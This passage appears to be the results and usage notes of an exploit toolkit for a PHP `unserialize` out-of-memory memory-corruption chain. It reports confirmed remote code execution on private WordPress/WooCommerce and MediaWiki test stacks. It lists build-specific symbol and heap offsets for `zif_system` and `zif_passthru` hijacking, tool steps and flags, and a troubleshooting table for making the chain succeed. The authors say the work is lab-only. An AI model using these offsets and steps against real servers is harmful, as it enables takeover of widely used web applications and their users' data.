| WordPress 7.1.3 + WooCommerce 11.2.1 | guest classic checkout, 12 address fields, 84 MiB synthetic pressure, WCS sink replica | producer OOM inside `unserialize`; the next multipart consumer writes into the stale dtor block; 1 of 4 consumers died with SIGSEGV (502), 3 of 4 returned 200; the sink is a labeled replica because paid WCS 9.0.0 was not on disk; no RCE claimed |
| MediaWiki 1.46.2 + Wikibase REL1_46, realapps 8.5.10 F12b | anonymous `POST /api.php`, `contentmodel=wikibase-item`, `contentformat=application/vnd.php.serialized`, 500,000 B probe | 1024 MiB OOM leaves `BG(unserialize).level=1`; the next request overwrites `ps_serializers[1].decode` (`0x22c54c8`) with `zif_system` (`0xa3c061`); marker `WIKI_ZIF` created, worker SIGSEGV at `php_exec+466`, FPM respawn, nginx 502 then health 200; **RCE confirmed** on the private ASLR-off target; clean gdb-free `zif_passthru` run on the ASLR-on WP stack in `receipts/realchain_20261022/`; no internet claim |

F12b is the real-target evaluation result: **confirmed** on the private
ASLR-off realapps 8.5.10 target (`zif_system` one-shot, marker created, worker
respawned). F14 is now **reproduced on a real target**: the WordPress/WooCommerce +
HexCoupon FPM stack under ASLR on served `K_dest` from the session file and the
gdb-free final request created `MARK_REAL` through `zif_passthru` with worker
`572531` alive (`receipts/realchain_20261022/`); `P`/`B0` still required a
pre-final gdb calibration. The MediaWiki/Wikibase ASLR-on survey found no in-band
pointer and the boot2 HTTP leak candidate remains **lab-only**. No internet
exploitation is claimed.

## Fingerprint and profile pack

| item | behavior | numbers |
|---|---|---|
| `--step recon` | GET the path, record status, server, connection, content type and body bytes | exit 0 alive, exit 2 not alive |
| disclosure gate | 14 B frozen profile disclosure at LEAK_OFFSET inside a main chunk | LEAK_OFFSET 0x57030, main chunk 0x200000 |
| `--step leak` | dry calibration plan, request shapes plus algorithm, no transport | 10 exchanges per stage, 3 stable triples, 4096 B Set-Cookie cap, approx 98 encoded pointers |
| `leak_offset` | decoded session array minus Zend chunk base, measured on libphp md5 `92f76e84a77bf8b56c45c3868fa29a6c` | 0x2188 = heap + 0x2148, heap = chunk + 0x40; 4 of 4 runs, ASLR on; build and mapping specific, not a universal constant |
| leak binding scope | the channel is the in-band `sidlen` / `sidhex` overread, not the Set-Cookie PS(id) channel | the Set-Cookie PS(id) offset is not separately measured; `target_offset` remains `TBD_from_leak_chunk_anchor` |
| address profile | `addresses/apache_libphp.json`, per binary offsets and lane | 40492240 B, md5 `92f76e84a77bf8b56c45c3868fa29a6c`, p_align 0x1000 |
| five resolved symbols | `zif_system` 0x40cc80, `zif_passthru` 0x40cc90, `zend_call_function` 0x540500, `zend_llist_remove_tail` 0x5d39a0, `zval_ptr_dtor` 0x5f0980 | deltas 0xb0480 and 0x1c6d10 |
| engine symbols | `php_url_encode` 0x460d70, `ps_globals` 0xa3b020, `basic_globals` 0xa3bdc0, `php_apache_sapi_ub_write` 0x5f7ee0, `zend_rc_dtor_func` 0x96f760 | PS(id) offset 16, PS(http_session_vars) offset 360 |
| G2/G6 profiles | `addresses/g2_fpm_8510.json`, `g2_fpm_8425.json`, `g2_fpm_8134.json`, `g2_fpm_7433.json`, `g2_fpm_realapps_8510.json` | 8.5.10 table 0x14c1b20, decode 0x14c1b60; 8.4.25 0xe01180; 8.1.34 0xe01140; 7.4.33 0xe010a0; realapps 8.5.10 `php` decode 0x22c54c8, zif_system 0xa3c061, zif_passthru 0xa3c074 (F12b; clean gdb-free run in `receipts/realchain_20261022/`); the four lab profiles use passthru = system + 0x10, all md5 locked, libc system 0x53090 |
| profile pack build | `universal/profile_builder.py` reads `nm` and `readelf` and writes `addresses/*.json` | new target needs `profiles.py` TARGETS plus BINARY_PROFILES |

## Failure diagnosis

| symptom | cause | check | action |
|---|---|---|---|
| no machinery fatal, benign body | uploads disabled, `session.upload_progress.enabled=0` | phpinfo or pool conf | enable upload progress and retry |
| request rejected before machinery | body at or above `post_max_size` 8388608 B | compare request bytes with 8388608 | use the 2M or 8M class, exit 2 |
| `NotImplementedError` on a memory limit | no receipted class; only 2M, 8M, 128M ship | `producer_unser.class_record` message | measure a new class first, exit 2 |
| modphp assumptions fail on FPM | SAPI mismatch; machinery OOM kills the FPM worker with exit 70 | phpinfo Server API | use the fpm app level producer plus the small arm |
| arm returns `0` with no OOM | modphp `memory_limit` knob absent or 128M build default | phpinfo `memory_limit` | set the knob, the producer refuses pre flight |
| same sid requests time out | session file flock queue | session save path lock holders | use a fresh sid except in the deliberate stale stage |
| g2 exits 2, missing address | X, P or B0 not supplied; zif modes also need X2 | `result.json` error lists the missing flag | pass all required addresses; the plan never guesses |
| g2 exits 2, unknown profile | version label, md5 or path not in the registry | `result.json` error lists valid labels | use a profile version, md5, or `.json` path |
| g2 exits 2, no transport | `--live` passed to an offline step | `result.json` says no transport | drop `--live` |
| g2 default php handler | php decode slot is not 16 byte aligned; a target at `table + 0x28` fails | `result.json` target and `ps_serializer_slot` | target `PS(serializer)` and write a fake struct pointer |
| g2 command error | php_binary command does not end `#` or is longer than 32 bytes | `result.json` error | trim and end with `#` |
| g2 zif missing X2 | zif_system/zif_passthru read the fake execute_data from the re-encoded second decode buffer | `result.json` error names `--g2-x2` | supply X2, not X1 |
| g2 zif command error | zif command is empty, contains NUL, or runs past the payload | `result.json` error / checks | use a non-empty NUL-free command and verify `cmd_off` bounds |
| g2 zif target error | `--g2-value`/`--libc-base` used with a zif mode, or target not aligned | `result.json` error | let the zif mode write the profile address; use an aligned slot |
| g2 zif_system worker crash | expected one-shot behavior: `php_exec type=1` writes `return_value=ZSTR_LEN(data)` | crash at `php_exec+450`, marker exists | use `zif_passthru` when worker survival matters |
| g2 zif_passthru failure | fake call type or command pointer wrong; type=3 does not crash on return_value | gdb `ser2decode`, `arg1type=6`, `F+0x10/F+0x18` | rebuild the record from the selected profile |
| g2 realapps php-slot target | the F12b `php` slot `0x22c54c8` is 8 mod 16 and not emitted by this builder; `--step g2` plans the `php_binary` entry `0x22c54e0` | `result.json` `serializer_entry` shows index 2 (`php_binary`) | use the receipt's `scripts/mkrec.py` for the `php`-slot record; `--g2-target 0x22c54c8` is rejected as unaligned |
| F12b crash at `php_exec+466` | expected one-shot: `type=1` writes the return zval through `return_value=ZSTR_LEN(data)=0x1d0230`, in the binary's `r--p` mapping | F12b `phase/consumer_02.txt`, marker exists, FPM respawn | none for this ABI; the clean gdb-free `zif_passthru` real-target run is in `receipts/realchain_20261022/` |
| g2 generic target error | in the php_binary builder, target not 16 byte aligned, or not reachable from B0 | `result.json` error | use an aligned target below B0 + 0x10; the F12b php-slot route uses the receipt's `mkrec.py` instead |
| g2 P or B0 outside payload | wrong X or total | check `p_off`, `b_off`, `payload_start` in `result.json` | re-measure X or the record length |
| g2 record checks fail | second slot above B0 or length does not converge | `result.json` checks | re-check the direction and total |
| g2 wrong build | offsets are build specific | compare md5 or build id with the profile | re-derive the profile, do not reuse offsets |
